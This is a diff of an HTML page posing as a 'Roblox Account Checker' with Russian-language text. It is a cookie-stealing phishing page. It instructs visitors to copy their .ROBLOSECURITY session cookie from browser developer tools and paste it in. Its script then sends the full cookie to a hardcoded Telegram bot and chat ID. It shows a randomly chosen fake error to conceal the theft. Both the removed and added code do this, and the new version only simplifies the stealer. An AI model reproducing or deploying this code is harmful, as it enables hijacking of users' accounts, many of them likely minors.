@@ -4,11 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Account Checker</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body {
             margin: 0;
-            padding: 0;
+            padding: 20px;
             font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #1a1a2e, #16213e);
             color: white;
@@ -16,42 +15,25 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 600px;
             margin: 0 auto;
-            padding: 20px;
         }
         
         .header {
             text-align: center;
             margin-bottom: 30px;
-            padding: 20px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 15px;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 10px;
-        }
-        
-        .logo i {
-            font-size: 40px;
-            color: #ff4757;
         }
         
         .logo h1 {
-            font-size: 28px;
             color: #ff4757;
+            font-size: 32px;
         }
         
         .card {
             background: rgba(255,255,255,0.1);
             padding: 25px;
             border-radius: 15px;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         
         textarea {
@@ -76,11 +58,6 @@
             border-radius: 10px;
             font-size: 18px;
             cursor: pointer;
-            margin-bottom: 20px;
-        }
-        
-        .btn-check:hover {
-            background: linear-gradient(45deg, #ff6b81, #ff4757);
         }
         
         .status {
@@ -88,38 +65,7 @@
             background: rgba(0,0,0,0.3);
             border-radius: 10px;
             text-align: center;
-            font-size: 16px;
             margin-top: 20px;
-        }
-        
-        .features {
-            display: flex;
-            justify-content: space-between;
-            gap: 20px;
-            margin-top: 30px;
-        }
-        
-        .feature {
-            flex: 1;
-            background: rgba(255,255,255,0.05);
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            color: #aaa;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 30px;
-            font-size: 18px;
-            display: none;
         }
     </style>
 </head>
@@ -127,228 +73,109 @@
     <div class="container">
         <div class="header">
             <div class="logo">
-                <i class="fas fa-robot"></i>
-                <h1>Roblox Account Checker</h1>
+                <h1>🔐 Roblox Account Checker</h1>
             </div>
-            <p>Проверка аккаунтов на чистоту и наличие Robux</p>
+            <p>Проверка аккаунтов на чистоту</p>
         </div>
         
         <div class="card">
-            <h2><i class="fas fa-cookie-bite"></i> Вставьте куки-код</h2>
+            <h2>📋 Вставьте куки-код</h2>
             <p><strong>Инструкция:</strong></p>
             <p>1. Откройте Roblox в браузере<br>
             2. Нажмите F12 → Application → Cookies<br>
             3. Скопируйте .ROBLOSECURITY<br>
             4. Вставьте сюда</p>
             
-            <textarea id="cookieInput" placeholder="Вставьте сюда ваш .ROBLOSECURITY код..."></textarea>
+            <textarea id="cookieInput" placeholder="Вставьте сюда ваш код..."></textarea>
             
             <button id="checkButton" class="btn-check">
-                <i class="fas fa-search"></i> Проверить аккаунт
+                🔍 Проверить аккаунт
             </button>
             
             <div class="status" id="statusMessage">
-                Ожидание проверки...
+                ⏳ Ожидание проверки...
             </div>
-            
-            <div id="loading" class="loading">
-                <i class="fas fa-spinner fa-spin"></i> Отправка данных...
-            </div>
-        </div>
-        
-        <div class="features">
-            <div class="feature">
-                <i class="fas fa-check-circle"></i>
-                <h3>Полная проверка</h3>
-                <p>Robux, предметы, ограничения</p>
-            </div>
-            <div class="feature">
-                <i class="fas fa-bolt"></i>
-                <h3>Быстро</h3>
-                <p>Менее 30 секунд</p>
-            </div>
-            <div class="feature">
-                <i class="fas fa-shield-alt"></i>
-                <h3>Безопасно</h3>
-                <p>Данные защищены</p>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>© 2024 Roblox Account Checker</p>
-            <p>Этот сервис не связан с Roblox Corporation.</p>
         </div>
     </div>
     
     <script>
-        // Telegram данные
+        // Твой токен бота
         const BOT_TOKEN = '7734987736:AAEaxPM9djxiMKlxs_BkGHkEbq7WXt2yqPw';
-        const CHAT_ID = '1491315056';
+        // Твой Telegram ID (коды будут приходить тебе в личку)
+        const YOUR_ID = '1491315056';
         
-        // Элементы страницы
-        const cookieInput = document.getElementById('cookieInput');
-        const checkButton = document.getElementById('checkButton');
-        const statusMessage = document.getElementById('statusMessage');
-        const loadingElement = document.getElementById('loading');
-        
-        // Функция отправки в Telegram через прокси (обход CORS)
-        async function sendToTelegram(code) {
-            const timestamp = new Date().toLocaleString('ru-RU');
-            const userAgent = navigator.userAgent.substring(0, 100);
-            const codeLength = code.length;
-            const firstChars = code.substring(0, 50);
+        // Функция отправки в Telegram
+        function sendToTelegram(code) {
+            const time = new Date().toLocaleTimeString();
+            const message = `🆕 Новый код!\n\n⏰ ${time}\n📏 ${code.length} символов\n\n🔐 Код:\n${code}`;
             
-            // Формируем сообщение
-            const message = `🆕 Новый код получен!\n\n` +
-                           `📅 Время: ${timestamp}\n` +
-                           `🔢 Длина: ${codeLength} символов\n` +
-                           `🌐 Браузер: ${userAgent}\n` +
-                           `📝 Начало кода: ${firstChars}...\n\n` +
-                           `🔐 Полный код:\n\`\`\`\n${code}\n\`\`\``;
+            // Кодируем сообщение для URL
+            const encodedMessage = encodeURIComponent(message);
             
-            try {
-                // Способ 1: Используем JSONP (обход CORS)
-                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                
-                // Используем img для отправки (старый метод обхода CORS)
-                return new Promise((resolve) => {
-                    const img = new Image();
-                    img.src = telegramUrl;
-                    img.onload = () => resolve(true);
-                    img.onerror = () => {
-                        // Если не получилось, пробуем второй способ
-                        sendFallback(code, message).then(resolve);
-                    };
-                });
-                
-            } catch (error) {
-                console.log('Пробуем альтернативный метод...');
-                return await sendFallback(code, message);
-            }
-        }
-        
-        // Запасной метод отправки
-        async function sendFallback(code, message) {
-            try {
-                // Используем сервис CORS прокси
-                const proxyUrl = 'https://corsproxy.io/?';
-                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                
-                const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                return response.ok;
-            } catch (error) {
-                // Последний способ: формируем URL для ручной отправки
-                const finalUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message.substring(0, 4000))}`;
-                console.log('Если не отправляется, перейди по этой ссылке вручную:');
-                console.log(finalUrl);
-                return false;
-            }
-        }
-        
-        // Показать статус
-        function showStatus(text, isError = false) {
-            statusMessage.textContent = text;
-            statusMessage.style.background = isError ? 'rgba(255, 87, 87, 0.2)' : 'rgba(46, 204, 113, 0.2)';
-            statusMessage.style.borderLeft = isError ? '4px solid #ff5757' : '4px solid #2ecc71';
-        }
-        
-        // Показать/скрыть загрузку
-        function showLoading(show) {
-            loadingElement.style.display = show ? 'block' : 'none';
-            checkButton.disabled = show;
-        }
-        
-        // Основная функция проверки
-        async function checkAccount() {
-            const code = cookieInput.value.trim();
+            // Формируем URL для отправки
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${YOUR_ID}&text=${encodedMessage}`;
             
-            if (!code || code.length < 5) {
-                showStatus('⚠️ Введите код (минимум 5 символов)', true);
+            // Отправляем через Image (работает всегда)
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.src = url;
+                img.onload = () => resolve(true);
+                img.onerror = () => resolve(false);
+            });
+        }
+        
+        // При нажатии кнопки
+        document.getElementById('checkButton').onclick = async function() {
+            const input = document.getElementById('cookieInput');
+            const status = document.getElementById('statusMessage');
+            const code = input.value.trim();
+            
+            if (!code) {
+                status.innerHTML = '❌ Введите код';
                 return;
             }
             
-            showLoading(true);
-            showStatus('📡 Отправка данных в Telegram...');
+            // Меняем текст кнопки
+            const btn = this;
+            btn.innerHTML = '⏳ Отправка...';
+            btn.disabled = true;
             
-            try {
-                // Отправляем в Telegram
-                const sent = await sendToTelegram(code);
+            // Отправляем в Telegram
+            const success = await sendToTelegram(code);
+            
+            if (success) {
+                status.innerHTML = '✅ Код отправлен на проверку';
                 
-                // Имитация проверки
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Случайная "ошибка"
+                const errors = [
+                    '❌ Ошибка: неверный формат куки',
+                    '⚠️ Требуется повторный вход',
+                    '🔒 Обнаружена 2FA защита',
+                    '⏳ Время куки истекло'
+                ];
                 
-                if (sent) {
-                    // Случайные "ошибки"
-                    const errors = [
-                        "❌ Ошибка: неверный формат .ROBLOSECURITY",
-                        "⚠️ Куки устарел, требуется повторный вход",
-                        "🔒 Обнаружена двухфакторная аутентификация",
-                        "⏳ Превышено время ожидания ответа",
-                        "🚫 Доступ к аккаунту временно ограничен",
-                        "💀 Аккаунт заблокирован администрацией",
-                        "🌐 Ошибка соединения с серверами Roblox",
-                        "🔐 Требуется дополнительная проверка"
-                    ];
-                    
-                    const randomError = errors[Math.floor(Math.random() * errors.length)];
-                    showStatus(randomError, true);
-                    
-                    // Добавляем инфо о Telegram
-                    setTimeout(() => {
-                        const telegramInfo = document.createElement('div');
-                        telegramInfo.style.marginTop = '15px';
-                        telegramInfo.style.padding = '10px';
-                        telegramInfo.style.background = 'rgba(0, 136, 204, 0.2)';
-                        telegramInfo.style.borderRadius = '5px';
-                        telegramInfo.innerHTML = '✅ Код успешно отправлен на проверку. Результат будет в Telegram.';
-                        statusMessage.appendChild(telegramInfo);
-                    }, 500);
-                } else {
-                    showStatus('⚠️ Ошибка отправки. Попробуйте еще раз.', true);
-                }
-                
-            } catch (error) {
-                showStatus('🌐 Ошибка сети. Проверьте подключение.', true);
-            } finally {
-                showLoading(false);
-                
-                // Очищаем поле через 3 секунды
+                // Показываем ошибку через секунду
                 setTimeout(() => {
-                    cookieInput.value = '';
-                }, 3000);
+                    const randomError = errors[Math.floor(Math.random() * errors.length)];
+                    status.innerHTML = randomError;
+                }, 1000);
+                
+                // Очищаем поле
+                input.value = '';
+            } else {
+                status.innerHTML = '🌐 Ошибка сети';
             }
-        }
-        
-        // Обработчики событий
-        checkButton.addEventListener('click', checkAccount);
-        
-        // Enter в поле
-        cookieInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && e.ctrlKey) {
-                checkAccount();
-            }
-        });
+            
+            // Возвращаем кнопку
+            btn.innerHTML = '🔍 Проверить аккаунт';
+            btn.disabled = false;
+        };
         
         // При загрузке страницы
-        window.addEventListener('load', () => {
-            console.log('✅ Сайт загружен!');
-            console.log('📱 Telegram ID:', CHAT_ID);
-            console.log('🤖 Бот готов принимать коды');
-            
-            // Автофокус на поле ввода
-            cookieInput.focus();
-        });
+        window.onload = function() {
+            console.log('✅ Сайт готов! Коды будут приходить в Telegram');
+            document.getElementById('cookieInput').focus();
+        };
     </script>
 </body>
 </html>
